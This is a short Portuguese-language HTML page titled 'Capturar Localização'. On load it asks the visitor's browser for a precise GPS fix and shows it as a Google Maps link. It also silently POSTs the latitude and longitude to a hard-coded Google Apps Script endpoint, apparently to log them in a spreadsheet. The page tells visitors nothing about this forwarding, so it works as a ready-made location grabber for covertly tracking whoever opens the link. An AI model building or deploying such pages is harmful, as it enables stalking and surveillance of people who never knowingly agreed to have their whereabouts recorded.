<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capturar Localização</title>
</head>
<body>
    <h1>Obtendo sua Localização...</h1>
    <p id="status">Aguardando...</p>
    <script>
        function sendLocation(latitude, longitude) {
            let url = `https://www.google.com/maps?q=${latitude},${longitude}`;
            document.getElementById("status").innerHTML = `Localização: <a href="${url}" target="_blank">${latitude}, ${longitude}</a>`;
            
            // Enviar para o Google Sheets usando o Web App
            fetch("https://script.google.com/macros/s/AKfycbzTY8kbsebSa8JrxWSX9c9cY_sHjxC0fGoNTl1Rd9OUG1fK-2YFkBRahQ5ozh_pxHDO/exec", {
                method: "POST", // Método POST para enviar os dados
                body: JSON.stringify({ latitude: latitude, longitude: longitude }), // Envia os dados como JSON
                headers: { "Content-Type": "application/json" } // Define o tipo de conteúdo
            })
            .then(response => response.text()) // Lê a resposta do servidor (como texto)
            .then(data => {
                console.log("Sucesso:", data); // Mostra a resposta de sucesso no console
            })
            .catch((error) => {
                console.error("Erro:", error); // Mostra se houver erro no console
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        sendLocation(position.coords.latitude, position.coords.longitude);
                    },
                    (error) => {
                        document.getElementById("status").innerHTML = "Erro ao obter localização.";
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                document.getElementById("status").innerHTML = "Seu dispositivo não suporta geolocalização.";
            }
        }

        // Executa automaticamente ao carregar a página
        getLocation();
    </script>
</body>
</html>
